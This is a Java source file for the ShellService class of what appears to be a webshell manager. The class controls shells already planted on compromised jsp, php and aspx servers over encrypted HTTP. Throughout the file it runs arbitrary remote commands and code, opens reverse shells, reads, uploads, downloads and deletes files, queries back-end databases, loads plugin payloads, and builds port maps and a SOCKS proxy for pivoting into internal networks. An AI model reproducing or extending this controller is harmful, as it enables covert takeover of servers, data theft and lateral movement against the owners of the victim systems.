package vip.youwe.sheller.core;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;

import org.json.JSONObject;
import vip.youwe.sheller.utils.Utils;

import java.io.FileOutputStream;
import java.util.*;

public class ShellService {

    public String currentUrl;
    public String currentPassword;
    public String currentKey;
    public String currentType;
    public Map<String, String> currentHeaders;
    public int encryptType;
    public int beginIndex;
    public int endIndex;
    public JSONObject shellEntity;
    public static int BUFFSIZE = 46080;

    public ShellService(JSONObject shellEntity, String userAgent) throws Exception {
        this.encryptType = Constants.ENCRYPT_TYPE_AES;
        this.beginIndex = 0;
        this.endIndex = 0;
        this.shellEntity = shellEntity;
        this.currentUrl = shellEntity.getString("url");
        this.currentType = shellEntity.getString("type");
        this.currentPassword = shellEntity.getString("password");
        this.currentHeaders = new HashMap();
        this.currentHeaders.put("User-Agent", userAgent);
        if (this.currentType.equals("php")) {

            this.currentHeaders.put("Content-type", "text/html;charset=utf-8");
        }

        mergeHeaders(this.currentHeaders, shellEntity.getString("headers"));
    }

    public static Map<String, Object> currentProxy;

    public static void setProxy(Map<String, Object> proxy) {
        currentProxy = proxy;
    }


    public static Map<String, Object> getProxy(Map<String, Object> proxy) {
        return currentProxy;
    }


    public JSONObject getShellEntity() {
        return this.shellEntity;
    }


    private void mergeCookie(Map<String, String> headers, String cookie) {
        if (headers.containsKey("Cookie")) {

            String userCookie = headers.get("Cookie");
            headers.put("Cookie", userCookie + ";" + cookie);
        } else {

            headers.put("Cookie", cookie);
        }
    }


    private void mergeHeaders(Map<String, String> headers, String headerTxt) {
        for (String line: headerTxt.split("\n")) {

            int semiIndex = line.indexOf(":");
            if (semiIndex> 0) {

                String key = line.substring(0, semiIndex);
                key = formatHeaderName(key);
                String value = line.substring(semiIndex + 1);
                if (!value.equals("")) {
                    headers.put(key, value);
                }
            }
        }
    }

    private String formatHeaderName(String beforeName) {
        String afterName = "";
        for (String element: beforeName.split("-")) {

            element = (element.charAt(0) + "").toUpperCase() + element.substring(1).toLowerCase();
            afterName = afterName + element + "-";
        }
        if (afterName.length()-beforeName.length() == 1 && afterName.endsWith("-"))
            afterName = afterName.substring(0, afterName.length()-1);
        return afterName;
    }

    public boolean doConnect() throws Exception {
        boolean result = false;

        String content = UUID.randomUUID().toString();
        this.currentKey = Utils.getKey(this.currentPassword);

        try {
            JSONObject obj = echo(content);
            if (obj.getString("msg").equals(content)) {
                result = true;

            }
        } catch (Exception e) {

            System.out.println("Enter the regular key agreement process");
            Map<String, String> keyAndCookie = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders);
            String cookie = keyAndCookie.get("cookie");
            if ((cookie == null || cookie.equals("")) && !this.currentHeaders.containsKey("cookie")) {

                String urlWithSession = keyAndCookie.get("urlWithSession");
                if (urlWithSession != null)
                    this.currentUrl = urlWithSession;
                this.currentKey = Utils.getKeyAndCookie(this.currentUrl, this.currentPassword, this.currentHeaders).get("key");
            } else {

                mergeCookie(this.currentHeaders, cookie);
                this.currentKey = keyAndCookie.get("key");
                if (this.currentType.equals("php") || this.currentType.equals("aspx")) {

                    this.beginIndex = Integer.parseInt(keyAndCookie.get("beginIndex"));
                    this.endIndex = Integer.parseInt(keyAndCookie.get("endIndex"));
                }
            }

            try {
                JSONObject obj = echo(content);
                if (obj.getString("msg").equals(content)) {
                    result = true;
                }
            } catch (Exception ex) {

                result = false;
            }
        }
        return result;
    }

    public String eval(String sourceCode) throws Exception {
        String result = null;
        byte[] payload = null;
        if (this.currentType.equals("jsp")) {
            payload = Utils.getClassFromSourceCode(sourceCode);
        } else {
            payload = sourceCode.getBytes();
        }
        byte[] data = Utils.getEvalData(this.currentKey, this.encryptType, this.currentType, payload);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        return new String(resData);
    }


    public JSONObject runCmd(String cmd) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", cmd);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Cmd", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");

        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject createBShell(String target, String localPort) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();

        params.put("action", "create");
        params.put("target", target);
        params.put("localPort", localPort);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);


        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");

        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject sendBShellCommand(String target, String action, String actionParams) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", action);
        params.put("target", target);
        params.put("params", actionParams);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "BShell", params, this.currentType);


        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");

        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject submitPluginTask(String taskID, String payloadPath, Map<String, String> pluginParams) throws Exception {
        byte[] pluginData = Utils.getPluginData(this.currentKey, this.encryptType, payloadPath, pluginParams, this.currentType);

        Map<String, String> params = new HashMap<String, String>();
        params.put("taskID", taskID);
        params.put("action", "submit");
        params.put("payload", Base64.encode(pluginData));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        // todo's hard-coded a.txt path file
        FileOutputStream fos = new FileOutputStream("/Users/rebeyond/a.txt");
        fos.write(Base64.encode(pluginData).getBytes());
        fos.flush();
        fos.close();
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");

        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject getPluginTaskResult(String taskID) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("taskID", taskID);
        params.put("action", "getResult");
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Plugin", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");

        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject loadJar(String libPath) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("libPath", libPath);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Loader", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject createRealCMD(String bashPath) throws Exception {
        JSONObject result;
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "create");
        params.put("bashPath", bashPath);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);


        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));


        if (!this.currentType.equals("php")) {

            result = new JSONObject(resultTxt);
        } else {

            result = new JSONObject();
            result.put("status", Base64.encode("success".getBytes()));
        }
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject stopRealCMD() throws Exception {
        JSONObject result;
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "stop");
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

        if (!this.currentType.equals("php")) {

            result = new JSONObject(resultTxt);
        } else {

            result = new JSONObject();
            result.put("status", Base64.encode("success".getBytes()));
            result.put("msg", Base64.encode("msg".getBytes()));
        }
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject readRealCMD() throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "read");
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject writeRealCMD(String cmd) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", "write");
        if (this.currentType.equals("php"))
            params.put("bashPath", "");
        params.put("cmd", Base64.encode(cmd.getBytes()));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "RealCMD", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject listFiles(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "list");
        params.put("path", path);

        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject deleteFile(String path) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "delete");
        params.put("path", path);

        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject showFile(String path, String charset) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "show");
        params.put("path", path);
        if (this.currentType.equals("php")) {

            params.put("content", "");
        } else if (this.currentType.equals("asp")) {

        }

        if (charset != null)
            params.put("charset", charset);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);


        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject renameFile(String oldName, String newName) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "rename");
        params.put("path", oldName);
        if (this.currentType.equals("php")) {

            params.put("content", "");
            params.put("charset", "");
        }
        params.put("newPath", newName);

        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject createFile(String fileName) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "createFile");
        params.put("path", fileName);

        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject createDirectory(String dirName) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "createDirectory");
        params.put("path", dirName);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public void downloadFile(String remotePath, String localPath) throws Exception {
        byte[] fileContent = null;
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "download");
        params.put("path", remotePath);

        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

        fileContent = (byte[]) Utils.sendPostRequestBinary(this.currentUrl, this.currentHeaders, data).get("data");
        FileOutputStream fso = new FileOutputStream(localPath);
        fso.write(fileContent);
        fso.flush();
        fso.close();
    }


    public JSONObject execSQL(String type, String host, String port, String user, String pass, String database, String sql) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("type", type);
        params.put("host", host);
        params.put("port", port);
        params.put("user", user);
        params.put("pass", pass);
        params.put("database", database);
        params.put("sql", sql);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Database", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }


    public JSONObject uploadFile(String remotePath, byte[] fileContent, boolean useBlock) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();

        JSONObject result = null;
        if (!useBlock) {
            params.put("mode", "create");
            params.put("path", remotePath);
            params.put("content", Base64.encode(fileContent));
            byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

            Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
            byte[] resData = (byte[]) resultObj.get("data");
            String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
            result = new JSONObject(resultTxt);
            for (String key: result.keySet()) {
                result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
            }
        } else {
            List<byte[]> blocks = Utils.splitBytes(fileContent, BUFFSIZE);
            for (int i = 0; i <blocks.size(); i++) {
                if (i == 0) {
                    params.put("mode", "create");
                } else {
                    params.put("mode", "append");
                }
                params.put("path", remotePath);
                params.put("content", Base64.encode((byte[]) blocks.get(i)));
                byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

                Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
                byte[] resData = (byte[]) resultObj.get("data");
                String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
                result = new JSONObject(resultTxt);
                for (String key: result.keySet()) {
                    result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
                }
            }
        }
        return result;
    }


    public JSONObject uploadFile(String remotePath, byte[] fileContent) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "create");
        params.put("path", remotePath);
        params.put("content", Base64.encode(fileContent));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public JSONObject appendFile(String remotePath, byte[] fileContent) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("mode", "append");
        params.put("path", remotePath);
        params.put("content", Base64.encode(fileContent));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "FileOperation", params, this.currentType);

        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));

        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

    public boolean createRemotePortMap(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        if (this.currentType.equals("php")) {
            params.put("socketHash", "");
        }
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);


        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (resHeader.get("status").equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {

                resData = Arrays.copyOfRange(resData, 4, resData.length);
                throw new Exception(new String(resData));
            }

            return true;
        }

        return false;
    }


    public boolean createRemoteSocks(String targetIP, String targetPort, String remoteIP, String remotePort) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "createRemote");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("remoteIP", remoteIP);
        params.put("remotePort", remotePort);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);


        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (resHeader.get("status").equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {
                resData = Arrays.copyOfRange(resData, 4, resData.length);
                throw new Exception(new String(resData));
            }

            return true;
        }

        return false;
    }


    public boolean createPortMap(String targetIP, String targetPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "createLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);

        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (resHeader.get("status").equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {

                resData = Arrays.copyOfRange(resData, 4, resData.length);
                throw new Exception(new String(resData));
            }

            return true;
        }

        return false;
    }

    public byte[] readPortMapData(String targetIP, String targetPort, String socketHash) throws Exception {
        byte[] resData = null;
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "read");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);

        Map<String, Object> result = null;

        try {
            result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        } catch (Exception e) {

            byte[] exceptionByte = e.getMessage().getBytes();
            if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {

                return null;
            }

            throw e;
        }


        Map<String, String> resHeader = (Map) result.get("header");
        if (resHeader.get("status").equals("200")) {
            resData = (byte[]) result.get("data");
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {

                resData = null;
            } else {
                if (resHeader.containsKey("server") && resHeader.get("server").indexOf("Apache-Coyote/1.1")> 0) {
                    resData = Arrays.copyOfRange(resData, 0, resData.length-1);
                }
                if (resData == null) {
                    resData = new byte[0];
                }
            }
        } else {
            resData = null;
        }
        return resData;
    }

    public boolean writePortMapData(byte[] proxyData, String targetIP, String targetPort, String socketHash) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "write");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);
        params.put("socketHash", socketHash);
        if (this.currentType.equals("php")) {

            params.put("remoteIP", "");
            params.put("remotePort", "");
        }
        params.put("extraData", Base64.encode(proxyData));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);


        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (resHeader.get("status").equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {

                resData = Arrays.copyOfRange(resData, 4, resData.length);

                return false;
            }
            return true;
        }

        return false;
    }


    public boolean closeLocalPortMap(String targetIP, String targetPort) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "closeLocal");
        params.put("targetIP", targetIP);
        params.put("targetPort", targetPort);

        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);


        Map<String, String> resHeader = (Map) Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");

        if (resHeader.get("status").equals("200")) {
            return true;
        }
        return false;
    }

    public boolean closeRemotePortMap() throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("action", "closeRemote");

        byte[] data = Utils.getData(this.currentKey, this.encryptType, "PortMap", params, this.currentType);


        Map<String, String> resHeader = (Map) Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");

        if (resHeader.get("status").equals("200")) {
            return true;
        }
        return false;
    }

    public byte[] readProxyData() throws Exception {
        byte[] resData = null;
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", "READ");
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);

        Map<String, Object> result = null;

        try {
            result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        } catch (Exception e) {

            byte[] exceptionByte = e.getMessage().getBytes();
            if (exceptionByte[0] == 55 && exceptionByte[1] == 33 && exceptionByte[2] == 73 && exceptionByte[3] == 54) {
                return null;
            }

            throw e;
        }


        Map<String, String> resHeader = (Map) result.get("header");
        if (resHeader.get("status").equals("200")) {
            resData = (byte[]) result.get("data");
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {

                resData = null;
            } else {
                if (resHeader.containsKey("server") && resHeader.get("server").indexOf("Apache-Coyote/1.1")> 0) {
                    resData = Arrays.copyOfRange(resData, 0, resData.length-1);
                }
                if (resData == null) {
                    resData = new byte[0];
                }
            }
        } else {
            resData = null;
        }
        return resData;
    }


    public boolean writeProxyData(byte[] proxyData) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", "FORWARD");

        params.put("targetIP", "");
        params.put("targetPort", "");

        params.put("extraData", Base64.encode(proxyData));
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);


        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (resHeader.get("status").equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {

                resData = Arrays.copyOfRange(resData, 4, resData.length);

                return false;
            }
            return true;
        }

        return false;
    }


    public boolean closeProxy() throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", "DISCONNECT");
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);


        Map<String, String> resHeader = (Map) Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex).get("header");

        if (resHeader.get("status").equals("200")) {
            return true;
        }
        return false;
    }


    public boolean openProxy(String destHost, String destPort) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("cmd", "CONNECT");
        params.put("targetIP", destHost);
        params.put("targetPort", destPort);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "SocksProxy", params, this.currentType);


        Map<String, Object> result = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> resHeader = (Map) result.get("header");
        byte[] resData = (byte[]) result.get("data");
        if (resHeader.get("status").equals("200")) {
            if (resData != null && resData.length >= 4 && resData[0] == 55 && resData[1] == 33 && resData[2] == 73 && resData[3] == 54) {

                resData = Arrays.copyOfRange(resData, 4, resData.length);

                return false;
            }
            return true;
        }

        return false;
    }


    public JSONObject echo(String content) throws Exception {
        Map<String, String> params = new LinkedHashMap<String, String>();
        params.put("content", content);
        byte[] data = Utils.getData(this.currentKey, this.encryptType, "Echo", params, this.currentType);


        Map<String, Object> resultObj = Utils.requestAndParse(this.currentUrl, this.currentHeaders, data, this.beginIndex, this.endIndex);
        Map<String, String> responseHeader = (Map) resultObj.get("header");
        String cookieValue = "";
        for (String headerName: responseHeader.keySet()) {
            if (headerName == null)
                continue;
            if (headerName.equalsIgnoreCase("Set-Cookie")) {
                cookieValue = responseHeader.get(headerName);
            }
        }
        mergeCookie(this.currentHeaders, cookieValue);
        byte[] resData = (byte[]) resultObj.get("data");
        String resultTxt = new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
        resultTxt = new String(resultTxt.getBytes("UTF-8"), "UTF-8");
        JSONObject result = new JSONObject(resultTxt);
        for (String key: result.keySet()) {
            result.put(key, new String(Base64.decode(result.getString(key)), "UTF-8"));
        }
        return result;
    }

